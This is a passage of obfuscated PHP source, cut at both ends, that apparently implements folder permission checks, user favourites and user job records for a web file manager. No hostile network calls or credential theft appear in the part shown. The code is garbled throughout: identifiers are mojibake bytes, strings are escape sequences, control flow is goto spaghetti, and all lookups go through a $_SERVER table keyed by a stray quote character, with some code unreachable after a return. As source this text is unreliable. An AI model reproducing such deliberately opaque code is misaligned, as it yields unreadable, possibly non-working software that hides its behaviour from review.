$AìÙá‹ëŞÔ[2266] => array($AìÙá‹ëŞÔ[388] => $AìÙá‹ëŞÔ[2273], $AìÙá‹ëŞÔ[2274] => $dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[391]][$AìÙá‹ëŞÔ[369]], $AìÙá‹ëŞÔ[2275] => $dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[465]])); return $D½³ØÄÀŞ’; } } goto F»˜·ØØ‰; EŠ…Š‹Úàî: return $D½³ØÄÀŞ’; goto eç÷£Ü¹â; F»˜·ØØ‰: $D½³ØÄÀŞ’ = !1; foreach ($e×»¶ö¬‚Ï as $aéóÖô“) { if (!isset($CÜ¢¸„õĞ[$aéóÖô“])) { continue; } $EİÁìÂ´Ê‚ = $this->authMake($CÜ¢¸„õĞ[$aéóÖô“]); if ($EİÁìÂ´Ê‚[$AìÙá‹ëŞÔ[418]]) { $D½³ØÄÀŞ’ = $EİÁìÂ´Ê‚; break; } } if (!$e¿Š®¡Õô´) { return $D½³ØÄÀŞ’; } goto dïĞæÙÚÓ; F·•®çÙá: $AìÙá‹ëŞÔ =& $_SERVER[“]; $eáà’ƒÎ£ = Session::get($AìÙá‹ëŞÔ[2224]); $eáà’ƒÎ£ = array_to_keyvalue($eáà’ƒÎ£, $AìÙá‹ëŞÔ[2095]); goto Eôªº™‘Ãˆ; dïĞæÙÚÓ: if (!$D½³ØÄÀŞ’ && isset($eáà’ƒÎ£[$EôÄ—´ ­¥])) { $B½«êïÇ‚Ñ = $eáà’ƒÎ£[$EôÄ—´ ­¥]; $dù²Ó‚»ï¸ = Model($AìÙá‹ëŞÔ[460])->getInfo($EôÄ—´ ­¥); $D½³ØÄÀŞ’ = array($AìÙá‹ëŞÔ[2271] => intval($B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]][$AìÙá‹ëŞÔ[376]]), $AìÙá‹ëŞÔ[2272] => $B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]], $AìÙá‹ëŞÔ[2266] => array($AìÙá‹ëŞÔ[388] => $AìÙá‹ëŞÔ[2276], $AìÙá‹ëŞÔ[75] => $dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[391]][$AìÙá‹ëŞÔ[369]], $AìÙá‹ëŞÔ[2275] => $dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[465]])); } if (!$D½³ØÄÀŞ’) { $dù²Ó‚»ï¸ = Model($AìÙá‹ëŞÔ[460])->getInfo($EôÄ—´ ­¥); $BÀ©æâÌ¤Í = explode($AìÙá‹ëŞÔ[47], trim($dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[461]], $AìÙá‹ëŞÔ[47])); foreach ($BÀ©æâÌ¤Í as $E·šøóæ) { if ($E·šøóæ == $AìÙá‹ëŞÔ[470] || $E·šøóæ == $Aòöİ¥÷Û) { continue; } if (!isset($eáà’ƒÎ£[$E·šøóæ])) { continue; } $B½«êïÇ‚Ñ = $eáà’ƒÎ£[$E·šøóæ]; $D½³ØÄÀŞ’ = array($AìÙá‹ëŞÔ[2271] => intval($B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]][$AìÙá‹ëŞÔ[376]]), $AìÙá‹ëŞÔ[2272] => $B½«êïÇ‚Ñ[$AìÙá‹ëŞÔ[376]], $AìÙá‹ëŞÔ[2266] => array($AìÙá‹ëŞÔ[388] => $AìÙá‹ëŞÔ[2273], $AìÙá‹ëŞÔ[2274] => $dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[391]][$AìÙá‹ëŞÔ[369]], $AìÙá‹ëŞÔ[2275] => $dù²Ó‚»ï¸[$AìÙá‹ëŞÔ[465]])); break; } } if (!$D½³ØÄÀŞ’ || $D½³ØÄÀŞ’[$AìÙá‹ëŞÔ[377]] <= 0) { $d—Š…ì«Ä = $this->authDeepCheck($eÍ”Æ°©Ê¦[$AìÙá‹ëŞÔ[369]]); if ($d—Š…ì«Ä) { $D½³ØÄÀŞ’ = $d—Š…ì«Ä; } } goto EŠ…Š‹Úàî; Eôªº™‘Ãˆ: $Aòöİ¥÷Û = $AìÙá‹ëŞÔ[83]; $e×»¶ö¬‚Ï = Model($AìÙá‹ëŞÔ[1104])->parentLevelArray($eÍ”Æ°©Ê¦[$AìÙá‹ëŞÔ[461]]); $e×»¶ö¬‚Ï = array_merge(array($eÍ”Æ°©Ê¦[$AìÙá‹ëŞÔ[369]]), array_reverse($e×»¶ö¬‚Ï)); goto F‚ò‹¤Í³ì; eç÷£Ü¹â: } public function authOwnerApply($bÔÍ„ —ÈŠ) { goto d‡ŒêÓñÕÃ; F¤Á à´İ: $Aˆ’›†æ½ = Model($A³éÕÜÜÍª[1104])->parentLevelArray($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[461]]); $Aˆ’›†æ½ = array_merge(array($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[369]]), array_reverse($Aˆ’›†æ½)); $EÉƒ¤ã¾Ê‡ = $A³éÕÜÜÍª[2261]; goto c·…Š¥¼ï; cëí¢µĞÕ: if (count($Fô‘Ê¤ô»¤) == 0) { $Fô‘Ê¤ô»¤ = $this->authFolderOwnerGroup($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[458]]); } $Fô‘Ê¤ô»¤ = array_unique($Fô‘Ê¤ô»¤); if (AuthModel::authCheckRoot($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[376]][$A³éÕÜÜÍª[377]])) { $Fô‘Ê¤ô»¤[] = USER_ID; } goto fÓİªÆ¦Ÿ³; c·…Š¥¼ï: $e¨Ÿ§—ˆ²… = array($A³éÕÜÜÍª[383] => array($A³éÕÜÜÍª[384], $Aˆ’›†æ½)); $cÉ‹¡Ú×ƒÇ = $this->field($EÉƒ¤ã¾Ê‡)->where($e¨Ÿ§—ˆ²…)->select(); $cÉ‹¡Ú×ƒÇ = array_to_keyvalue_group($cÉ‹¡Ú×ƒÇ, $A³éÕÜÜÍª[369]); goto cÃ‹âµêº; fÓİªÆ¦Ÿ³: $bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[376]][$A³éÕÜÜÍª[2279]] = Model($A³éÕÜÜÍª[476])->userListInfo($Fô‘Ê¤ô»¤); return $bÔÍ„ —ÈŠ; goto aµØÏÁïòÛ; d‡ŒêÓñÕÃ: $A³éÕÜÜÍª =& $_SERVER[“]; if (empty($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[376]]) || isset($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[2277]]) && $bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[2277]]) { return $bÔÍ„ —ÈŠ; } if (AuthModel::authCheckRoot($bÔÍ„ —ÈŠ[$A³éÕÜÜÍª[376]][$A³éÕÜÜÍª[377]])) { return $bÔÍ„ —ÈŠ; } goto F¤Á à´İ; cÃ‹âµêº: $eâˆ¢é“Ş = array(); $Fô‘Ê¤ô»¤ = array(); foreach ($cÉ‹¡Ú×ƒÇ as $b›¶ê‹çã => $F’Í™‹ù‚Ë) { $B Ú•¼à¡Õ = $this->authFolderOwnerUser($F’Í™‹ù‚Ë); $eâˆ¢é“Ş[$b›¶ê‹çã] = $B Ú•¼à¡Õ; $Fô‘Ê¤ô»¤ = array_merge($Fô‘Ê¤ô»¤, $B Ú•¼à¡Õ[$A³éÕÜÜÍª[537]]); if ($B Ú•¼à¡Õ[$A³éÕÜÜÍª[2278]]) { break; } } goto cëí¢µĞÕ; aµØÏÁïòÛ: } private function authFolderOwnerGroup($c¨®‹¢ÊÏô) { $F¢—Ò“…£ =& $_SERVER[“]; $bİö’¨ù´¤ = Model($F¢—Ò“…£[2174])->where(array($F¢—Ò“…£[2095] => $c¨®‹¢ÊÏô))->select(); $DÀ­İÁË½í = array(); if (!$bİö’¨ù´¤) { return $DÀ­İÁË½í; } foreach ($bİö’¨ù´¤ as $E™êÌ¥©Œ) { $fÏ§‚¤±Â— = $this->authInfo($E™êÌ¥©Œ); if (AuthModel::authCheckRoot($fÏ§‚¤±Â—[$F¢—Ò“…£[376]])) { $DÀ­İÁË½í[] = $E™êÌ¥©Œ[$F¢—Ò“…£[1423]]; } } return $DÀ­İÁË½í; } private function authFolderOwnerUser($cæª°©Ç°) { $dÑòã¸½Òï =& $_SERVER[“]; $Eâ¶æÛ ù‘ = array(); $e„“­Å’ = !1; foreach ($cæª°©Ç° as $d°êí‹µ¥‘) { $d´ã¦˜… = $this->authInfo($d°êí‹µ¥‘); if ($d°êí‹µ¥‘[$dÑòã¸½Òï[458]] == $dÑòã¸½Òï[470]) { $e„“­Å’ = !0; } if ($d°êí‹µ¥‘[$dÑòã¸½Òï[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($d´ã¦˜…[$dÑòã¸½Òï[376]])) { $Eâ¶æÛ ù‘[] = $d°êí‹µ¥‘[$dÑòã¸½Òï[458]]; } } } return array($dÑòã¸½Òï[537] => $Eâ¶æÛ ù‘, $dÑòã¸½Òï[2278] => $e„“­Å’); } public function authMake($C—ÎÙ—äĞ) { goto Bšø¯™˜è; f¨•„Ö³á¶: $eŠã‰ÑËÈå = array($a™ì‰è—Ê[2271] => intval($Aùå˜´¤‚), $a™ì‰è—Ê[2272] => $bÃÆÅŠòÑ, $a™ì‰è—Ê[2266] => array($a™ì‰è—Ê[388] => $D±¾ˆ›•Êİ, $a™ì‰è—Ê[75] => $EÏ…Ş›¶î[$a™ì‰è—Ê[369]])); return $eŠã‰ÑËÈå; goto B¸ò¯šèÍã; EÊâªß‡º : $B¯‚ÙóŒã = array_to_keyvalue($E„†¨á¦ˆ, $a™ì‰è—Ê[33], $a™ì‰è—Ê[2095]); $e°Íã®º×« = 0; $e—¥µ‚´ï¦ = 0; goto eøøÜ•×Ó; eøøÜ•×Ó: $fËÒäƒ¿ÚÍ = 0; $BéäãÃ‘­¿ = 0; $eË‹ÎíöÜî = 0; goto EÑë›ÁòÍÚ; Bšø¯™˜è: $a™ì‰è—Ê =& $_SERVER[“]; if (!$C—ÎÙ—äĞ) { return array($a™ì‰è—Ê[377] => 0, $a™ì‰è—Ê[418] => !1); } $E„†¨á¦ˆ = Session::get($a™ì‰è—Ê[2224]); goto EÊâªß‡º ; Fæè³›àĞ¯: $C¨§½¦Ï®¥ = 0; $EÏ…Ş›¶î = array($a™ì‰è—Ê[369] => 0); foreach ($C—ÎÙ—äĞ as $EÏ…Ş›¶î) { $bÃÆÅŠòÑ = $this->authInfo($EÏ…Ş›¶î); $DÊ‡„â¦˜ = $EÏ…Ş›¶î[$a™ì‰è—Ê[458]]; $cÖóÂ–¤ùÌ = intval($bÃÆÅŠòÑ[$a™ì‰è—Ê[376]]); if ($EÏ…Ş›¶î[$a™ì‰è—Ê[371]] == SourceModel::TYPE_USER && $DÊ‡„â¦˜ == USER_ID) { $a¼ÁÙ¥ÈÚ¯ = !0; $BéäãÃ‘­¿ = $bÃÆÅŠòÑ; $e°Íã®º×« = $cÖóÂ–¤ùÌ; } else { if ($EÏ…Ş›¶î[$a™ì‰è—Ê[371]] == SourceModel::TYPE_GROUP && in_array($DÊ‡„â¦˜, $B¯‚ÙóŒã)) { $Eä••™¯“˜ = !0; if ($cÖóÂ–¤ùÌ >= $e—¥µ‚´ï¦) { $e—¥µ‚´ï¦ = $cÖóÂ–¤ùÌ; $eË‹ÎíöÜî = $bÃÆÅŠòÑ; } } else { if ($DÊ‡„â¦˜ == $a™ì‰è—Ê[470]) { $C¨§½¦Ï®¥ = !0; $bÉ¾¢¶…®˜ = $bÃÆÅŠòÑ; $fËÒäƒ¿ÚÍ = $cÖóÂ–¤ùÌ; } } } } goto fÊÂÜ—ŠÇï; EÑë›ÁòÍÚ: $bÉ¾¢¶…®˜ = 0; $a¼ÁÙ¥ÈÚ¯ = 0; $Eä••™¯“˜ = 0; goto Fæè³›àĞ¯; fÊÂÜ—ŠÇï: $Aùå˜´¤‚ = $a¼ÁÙ¥ÈÚ¯ ? $e°Íã®º×« : ($Eä••™¯“˜ ? $e—¥µ‚´ï¦ : $fËÒäƒ¿ÚÍ); $bÃÆÅŠòÑ = $a¼ÁÙ¥ÈÚ¯ ? $BéäãÃ‘­¿ : ($Eä••™¯“˜ ? $eË‹ÎíöÜî : $bÉ¾¢¶…®˜); $D±¾ˆ›•Êİ = $a¼ÁÙ¥ÈÚ¯ ? $a™ì‰è—Ê[2280] : ($Eä••™¯“˜ ? $a™ì‰è—Ê[2281] : ($C¨§½¦Ï®¥ ? $a™ì‰è—Ê[2282] : $a™ì‰è—Ê[361])); goto f¨•„Ö³á¶; B¸ò¯šèÍã: } public function authTargetInfoMake($B¬¥÷èÛõ…) { goto aÛÈ‚‰äïé; bêˆ„¾Ç±Ë: foreach ($B¬¥÷èÛõ… as $eŠ¦İ„øë) { if ($eŠ¦İ„øë[$d÷²à±îŸÍ[371]] == SourceModel::TYPE_USER) { $d÷„ÈÃà²˜[] = intval($eŠ¦İ„øë[$d÷²à±îŸÍ[458]]); } else { if ($eŠ¦İ„øë[$d÷²à±îŸÍ[371]] == SourceModel::TYPE_GROUP) { $B˜Ö³…Úä[] = intval($eŠ¦İ„øë[$d÷²à±îŸÍ[458]]); } } } if ($d÷„ÈÃà²˜) { $d÷„ÈÃà²˜ = Model($d÷²à±îŸÍ[476])->userListInfo($d÷„ÈÃà²˜); } if ($B˜Ö³…Úä) { $cï”‡†š¸¤ = array($d÷²à±îŸÍ[2172] => array($d÷²à±îŸÍ[384], $B˜Ö³…Úä)); $B˜Ö³…Úä = Model($d÷²à±îŸÍ[460])->field($d÷²à±îŸÍ[2185])->where($cï”‡†š¸¤)->select(); $B˜Ö³…Úä = array_to_keyvalue($B˜Ö³…Úä, $d÷²à±îŸÍ[2095]); } goto A¯á·…Ø÷™; aÛÈ‚‰äïé: $d÷²à±îŸÍ =& $_SERVER[“]; $d÷„ÈÃà²˜ = array(); $B˜Ö³…Úä = array(); goto bêˆ„¾Ç±Ë; A¯á·…Ø÷™: return array($d÷²à±îŸÍ[2283] => $d÷„ÈÃà²˜, $d÷²à±îŸÍ[2275] => $B˜Ö³…Úä); goto Eãëæ£²¿²; Eãëæ£²¿²: } public function authInfo($f‰ˆ›È§ï¹) { $b…“ß¹§† =& $_SERVER[“]; if ($f‰ˆ›È§ï¹[$b…“ß¹§†[2239]]) { $E‹‰‚ëğ = Model($b…“ß¹§†[2258])->listData($f‰ˆ›È§ï¹[$b…“ß¹§†[2239]]); if (!$E‹‰‚ëğ) { return !1; $F‘‰°–“õ— = Model($b…“ß¹§†[2258])->listData(); $c¡Ü‚óó¡ = array_filter_by_field($F‘‰°–“õ—, $b…“ß¹§†[376], $b…“ß¹§†[470]); return $c¡Ü‚óó¡; } $d‘óÌìœïÎ = array_field_key($E‹‰‚ëğ, array($b…“ß¹§†[367], $b…“ß¹§†[28], $b…“ß¹§†[376], $b…“ß¹§†[2113], $b…“ß¹§†[2116])); $d‘óÌìœïÎ[$b…“ß¹§†[2284]] = $f‰ˆ›È§ï¹; return $d‘óÌìœïÎ; } else { return array($b…“ß¹§†[385] => 0, $b…“ß¹§†[2101] => $f‰ˆ›È§ï¹[$b…“ß¹§†[2240]], $b…“ß¹§†[386] => $b…“ß¹§†[33], $b…“ß¹§†[2113] => $b…“ß¹§†[2285]); } } } goto fÖ“µ¤è Ÿ; fÒäœ‘©: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($e×¡µßÌî) { $Bñè«ù±Ã =& $_SERVER[“]; return array($Bñè«ù±Ã[2191] => array(USER_ID, $Bñè«ù±Ã[2495])); } protected function listData() { $Eæâ¹ãö‹¬ =& $_SERVER[“]; $b‰ñÁ‘‹Š‰ = array($Eæâ¹ãö‹¬[1413] => USER_ID, $Eæâ¹ãö‹¬[436] => 0); $B»¢·†ÙâĞ = $Eæâ¹ãö‹¬[2496]; $E×¶Ïí¤Ñé = $this->field($B»¢·†ÙâĞ)->where($b‰ñÁ‘‹Š‰)->order($Eæâ¹ãö‹¬[2497])->select(); return $E×¶Ïí¤Ñé ? $E×¶Ïí¤Ñé : array(); } protected function resetCache() { } protected function listView() { goto B†ƒ¨ç¹¶¨; Ağ£ÔÑŞ–: $B‡…ÓÀÍˆ¦ = array_to_keyvalue($B‡…ÓÀÍˆ¦, $A—¹êí™•[369]); foreach ($EÃ†öïÙ‚Ü as $d©Õ›ÂŠ·ª => $d¹«äÎÄ±×) { $Fóñ†ŠÔõ = $B‡…ÓÀÍˆ¦[$d¹«äÎÄ±×[$A—¹êí™•[75]]]; $Fóñ†ŠÔõ = $Fóñ†ŠÔõ ? $Fóñ†ŠÔõ : array(); $EÃ†öïÙ‚Ü[$d©Õ›ÂŠ·ª] = array_merge($Fóñ†ŠÔõ, $d¹«äÎÄ±×); } return $EÃ†öïÙ‚Ü; goto CÅ‘“Éš­”; cßõ­µ‚®¶: $f‚ó¹ˆø÷Í = array_to_keyvalue($E²©ÜŠ÷Œ, $A—¹êí™•[33], $A—¹êí™•[75]); if (!$f‚ó¹ˆø÷Í) { return $EÃ†öïÙ‚Ü; } $B¥îöù« = 2000; goto FºŒÛ“’Œ§; FºŒÛ“’Œ§: $FÁ­µØ†˜™ = array($A—¹êí™•[383] => array($A—¹êí™•[384], $f‚ó¹ˆø÷Í)); $B‡…ÓÀÍˆ¦ = Model($A—¹êí™•[736])->listSource($FÁ­µØ†˜™, $B¥îöù«); $B‡…ÓÀÍˆ¦ = array_merge($B‡…ÓÀÍˆ¦[$A—¹êí™•[73]], $B‡…ÓÀÍˆ¦[$A—¹êí™•[74]]); goto Ağ£ÔÑŞ–; B†ƒ¨ç¹¶¨: $A—¹êí™• =& $_SERVER[“]; $EÃ†öïÙ‚Ü = $this->listData(); $E²©ÜŠ÷Œ = array_filter_by_field($EÃ†öïÙ‚Ü, $A—¹êí™•[29], $A—¹êí™•[382]); goto cßõ­µ‚®¶; CÅ‘“Éš­”: } protected function addFav($dÙÄ«‰, $Bøó‘ËòÎš = '', $FåƒÊùçÃ = "\163\157\x75\x72\143\145") { goto Cñø“×±—²; E£›‰’­ÙÒ: $c‚¹¿¥°±ó = array($Cíè–½Å°ò[1413] => USER_ID, $Cíè–½Å°ò[436] => 0); $e¥†ËºÜ = $this->where($c‚¹¿¥°±ó)->max($Cíè–½Å°ò[2116]); if (!$e¥†ËºÜ) { $e¥†ËºÜ = 0; } goto e‹æµ›¾³; e‹æµ›¾³: if (!$Bøó‘ËòÎš && $FåƒÊùçÃ == $Cíè–½Å°ò[382]) { $f£•Îª×¿ø = Model($Cíè–½Å°ò[1104])->where(array($Cíè–½Å°ò[383] => $dÙÄ«‰))->find(); if (!$f£•Îª×¿ø) { return !1; } $Bøó‘ËòÎš = $f£•Îª×¿ø[$Cíè–½Å°ò[28]]; } $Bøó‘ËòÎš = $this->getAutoName($Bøó‘ËòÎš); $F‰®±ã‘Š = array($Cíè–½Å°ò[1413] => USER_ID, $Cíè–½Å°ò[436] => 0, $Cíè–½Å°ò[386] => $Bøó‘ËòÎš, $Cíè–½Å°ò[387] => $dÙÄ«‰, $Cíè–½Å°ò[388] => $FåƒÊùçÃ, $Cíè–½Å°ò[2099] => $e¥†ËºÜ + 1); goto Eçé‹³…¬; Eçé‹³…¬: return $this->add($F‰®±ã‘Š); goto CÅ—¼ÎÁ£¶; Cñø“×±—²: $Cíè–½Å°ò =& $_SERVER[“]; $c‚¹¿¥°±ó = array($Cíè–½Å°ò[1413] => USER_ID, $Cíè–½Å°ò[436] => 0, $Cíè–½Å°ò[388] => $FåƒÊùçÃ, $Cíè–½Å°ò[387] => $dÙÄ«‰); if ($this->where($c‚¹¿¥°±ó)->find()) { return !1; } goto E£›‰’­ÙÒ; CÅ—¼ÎÁ£¶: } protected function remove($E ê¬´©»à) { $CÓÀ”òŸ =& $_SERVER[“]; $B—¾™ÕİÏ’ = array($CÓÀ”òŸ[1413] => USER_ID, $CÓÀ”òŸ[385] => $E ê¬´©»à); return $this->where($B—¾™ÕİÏ’)->delete(); } protected function removeByName($DŸÊêØÄ³™) { $EŸñ•¡À‚ë =& $_SERVER[“]; $C¨†¤¡´ĞŠ = array($EŸñ•¡À‚ë[1413] => USER_ID, $EŸñ•¡À‚ë[386] => $DŸÊêØÄ³™, $EŸñ•¡À‚ë[436] => 0); return $this->where($C¨†¤¡´ĞŠ)->delete(); } protected function rename($e«ÇŠšá’, $DÖ”‘ãæòÚ) { $e°£ù£“·Ú =& $_SERVER[“]; if ($e«ÇŠšá’ == $DÖ”‘ãæòÚ) { return !1; } $cŒ“ÑŸÉ‹ì = $this->getAutoName($DÖ”‘ãæòÚ); if ($DÖ”‘ãæòÚ != $cŒ“ÑŸÉ‹ì) { return !1; } $Bù‰¦ƒÊêÅ = array($e°£ù£“·Ú[1413] => USER_ID, $e°£ù£“·Ú[436] => 0, $e°£ù£“·Ú[28] => $e«ÇŠšá’); return $this->where($Bù‰¦ƒÊêÅ)->save(array($e°£ù£“·Ú[28] => $DÖ”‘ãæòÚ)); } protected function resetSort($dµÌŠÌÚãó) { $bÊ…Û¾é‰‘ =& $_SERVER[“]; $dµÌŠÌÚãó = is_array($dµÌŠÌÚãó) ? $dµÌŠÌÚãó : array(); $F·ã‰æÛ = array($bÊ…Û¾é‰‘[1413] => USER_ID); for ($aŞÜà· Ãõ = 0; $aŞÜà· Ãõ < count($dµÌŠÌÚãó); $aŞÜà· Ãõ++) { $F·ã‰æÛ[$bÊ…Û¾é‰‘[385]] = $dµÌŠÌÚãó[$aŞÜà· Ãõ]; $this->where($F·ã‰æÛ)->save(array($bÊ…Û¾é‰‘[2099] => $aŞÜà· Ãõ + 1)); } return !0; } protected function moveTop($Aæ‰Êåœ¿Í) { goto cÆ¢äÍÔ›; EÇœÁñ¤ : $b…ˆ£¬‹´ = $a¦ªƒ†Ø¢‡; $a¦ªƒ†Ø¢‡ = array_remove_value($a¦ªƒ†Ø¢‡, $E”×ˆ’‹¤ß[$eà×¬¤ó¹ñ[367]]); array_unshift($a¦ªƒ†Ø¢‡, $E”×ˆ’‹¤ß[$eà×¬¤ó¹ñ[367]]); goto EÕµæ·î£; cÆ¢äÍÔ›: $eà×¬¤ó¹ñ =& $_SERVER[“]; $báğÑ˜Ù“ = array($eà×¬¤ó¹ñ[1413] => USER_ID, $eà×¬¤ó¹ñ[436] => 0); $E”×ˆ’‹¤ß = $this->where($báğÑ˜Ù“)->where(array($eà×¬¤ó¹ñ[28] => $Aæ‰Êåœ¿Í))->find(); goto BÂ©åâŞâƒ; EÕµæ·î£: return $this->resetSort($a¦ªƒ†Ø¢‡); goto DëŸà»àÌ; BÂ©åâŞâƒ: if (!$E”×ˆ’‹¤ß) { return; } $a¦ªƒ†Ø¢‡ = $this->field($eà×¬¤ó¹ñ[367])->where($báğÑ˜Ù“)->order($eà×¬¤ó¹ñ[2497])->select(); $a¦ªƒ†Ø¢‡ = array_to_keyvalue($a¦ªƒ†Ø¢‡, $eà×¬¤ó¹ñ[33], $eà×¬¤ó¹ñ[367]); goto EÇœÁñ¤ ; DëŸà»àÌ: } protected function moveBottom($FÌŒ–èÛ¬ä) { $aªÍÅ°ÊœŞ =& $_SERVER[“]; $FƒäÃÙ‰®  = array($aªÍÅ°ÊœŞ[1413] => USER_ID, $aªÍÅ°ÊœŞ[436] => 0); $eß¢£ÔÁò = $this->where($FƒäÃÙ‰® )->max($aªÍÅ°ÊœŞ[2116]); $eÌÊ³­Õœ = array($aªÍÅ°ÊœŞ[2116] => $eß¢£ÔÁò + 1); return $this->where($FƒäÃÙ‰® )->where(array($aªÍÅ°ÊœŞ[28] => $FÌŒ–èÛ¬ä))->save($eÌÊ³­Õœ); } private function getAutoName($cƒ‰éµøËó) { goto a­ä›êï©; a­ä›êï©: $Bñ‡Ì»à¥• =& $_SERVER[“]; $BšŒ½íî‰‚ = array($Bñ‡Ì»à¥•[1413] => USER_ID, $Bñ‡Ì»à¥•[436] => 0); $fƒ •™ó‹Û = $this->field($Bñ‡Ì»à¥•[28])->where($BšŒ½íî‰‚)->select(); goto bò’Ó™„Ù¬; bò’Ó™„Ù¬: $fƒ •™ó‹Û = array_to_keyvalue($fƒ •™ó‹Û, $Bñ‡Ì»à¥•[33], $Bñ‡Ì»à¥•[28]); if (!$fƒ •™ó‹Û || !in_array($cƒ‰éµøËó, $fƒ •™ó‹Û)) { return $cƒ‰éµøËó; } for ($A“ù—½”‘¨ = 0; $A“ù—½”‘¨ < count($fƒ •™ó‹Û); $A“ù—½”‘¨++) { if (!in_array($cƒ‰éµøËó . "\x28{$A“ù—½”‘¨}\51", $fƒ •™ó‹Û)) { return $cƒ‰éµøËó . "\x28{$A“ù—½”‘¨}\51"; } } goto däÕÂÀ‚Õ; däÕÂÀ‚Õ: return $cƒ‰éµøËó . "\x28{$A“ù—½”‘¨}\51"; goto Eğ‘»Å±ÈŒ; Eğ‘»Å±ÈŒ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x6a\157\x62\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x64\x65\x73\143", "\163\x6f\162\164"); const JOB_KEY = "\163\x65\154\x66\112\157\x62\114\151\163\164"; public function listData($c‡ÀÌì¡ = false, $fŒŞ®ˆ¢± = "\163\157\x72\x74", $FÌŠèÊÖ‰¥ = false) { return parent::listData($c‡ÀÌì¡, $fŒŞ®ˆ¢±, $FÌŠèÊÖ‰¥); } public function remove($aêÁİ•¸±) { return parent::remove($aêÁİ•¸±); } public function add($d¬§½èÌ¾ß) { $FÂøÚ“Â³ =& $_SERVER[“]; if ($this->findByName($d¬§½èÌ¾ß[$FÂøÚ“Â³[28]])) { return !1; } $d¬§½èÌ¾ß[$FÂøÚ“Â³[2116]] = $this->getSort(); return parent::insert($d¬§½èÌ¾ß); } private function getSort() { $a½æ¹ÄçÍÏ =& $_SERVER[“]; $Cœ¿Á§øè¡ = parent::listData(); $f¼Ü„±´¾ = array_to_keyvalue($Cœ¿Á§øè¡, $a½æ¹ÄçÍÏ[33], $a½æ¹ÄçÍÏ[2116]); return empty($f¼Ü„±´¾) ? 0 : max($f¼Ü„±´¾) + 1; } public function update($a—ŸšÚ„“Û, $CàóšÏÊÎ¿) { $b’†½¬ÕİÅ =& $_SERVER[“]; $DÒÊË£„µ¦ = parent::listData($a—ŸšÚ„“Û); $fù¶¶ßäù = $this->findByName($CàóšÏÊÎ¿[$b’†½¬ÕİÅ[28]]); if (!$DÒÊË£„µ¦ || $fù¶¶ßäù && $fù¶¶ßäù[$b’†½¬ÕİÅ[367]] != $DÒÊË£„µ¦[$b’†½¬ÕİÅ[367]]) { return !1; } return parent::update($a—ŸšÚ„“Û, $CàóšÏÊÎ¿); } public function setUserJob($a¸æãÊ®¡³, $C¸ˆØ»ÔÏ³) { goto a«›ÚÆÆ™Å; c˜âÔ’Î¦: $bŞÚç±«”ê = rtrim($bŞÚç±«”ê, $DÚÍòÃ³•[47]); Model($DÚÍòÃ³•[479])->metaSet($a¸æãÊ®¡³, self::JOB_KEY, $bŞÚç±«”ê); goto dïÉ³²áç; a«›ÚÆÆ™Å: $DÚÍòÃ³• =& $_SERVER[“]; if (!is_array($C¸ˆØ»ÔÏ³)) { $C¸ˆØ»ÔÏ³ = array($C¸ˆØ»ÔÏ³); } $E®ˆÌ…ó¦Â = parent::listData(); goto A–õÜ‡á”é; A–õÜ‡á”é: $A¤Üè§‘ö = array_to_keyvalue($E®ˆÌ…ó¦Â, $DÚÍòÃ³•[28]); $bŞÚç±«”ê = $DÚÍòÃ³•[361]; foreach ($C¸ˆØ»ÔÏ³ as $C†ÁšÂÌ‰) { if ($A¤Üè§‘ö[$C†ÁšÂÌ‰]) { $bŞÚç±«”ê .= $A¤Üè§‘ö[$C†ÁšÂÌ‰][$DÚÍòÃ³•[367]] . $DÚÍòÃ³•[47]; } else { $f­‹—ÃÕ = $this->add($C†ÁšÂÌ‰); $bŞÚç±«”ê .= $f­‹—ÃÕ . $DÚÍòÃ³•[47]; } } goto c˜âÔ’Î¦; dïÉ³²áç: } public function getUserJob($CŸ’¯Ìì¢Š) { $C·Õ«Í¦Íæ = Model($_SERVER[“][479])->metaGet($CŸ’¯Ìì¢Š); return $this->getUserJobInfo($C·Õ«Í¦Íæ[self::JOB_KEY]); } public function getUserJobInfo($B²°ãÁâ×Š) { goto Fí éÙµ¯Ä; cÇ¡Âõœ˜²: return $B’ãøÇŞ½; goto cà –ùƒ²‘; Fí éÙµ¯Ä: $F¨«Ô™Õ¿ğ =& $_SERVER[“]; $B¶¸Ùâ™—Æ = explode($F¨«Ô™Õ¿ğ[47], $B²°ãÁâ×Š); $aè ã…¤Ê = parent::listData(); goto b¼÷¦¹‘çÏ; b¼÷¦¹‘çÏ: $aè ã…¤Ê = array_remove_key($aè ã…¤Ê, $F¨«Ô™Õ¿ğ[187]); $B’ãøÇŞ½ = array(); foreach ($B¶¸Ùâ™—Æ as $eóÕ…³”°) { if (isset($aè ã…¤Ê[$eóÕ…³”°])) { $B’ãøÇŞ½[] = $aè ã…¤Ê[$eóÕ…³”°]; } } goto cÇ¡Âõœ˜²; cà –ùƒ²‘: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\155\x65" => "\x75\163\145\162\137\155\x65\164\141", "\x6d\145\164\141\x46\151\x65\x6c\x64" => "\x75\x73\145\x72\111\x44"); protected $simpleField = "\165\163\x65\162\111\104\x2c\x6e\151\143\x6b\116\x61\155\145\54\x6e\x61\x6d\x65\x2c\x61\x76\141\164\x61\162\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE 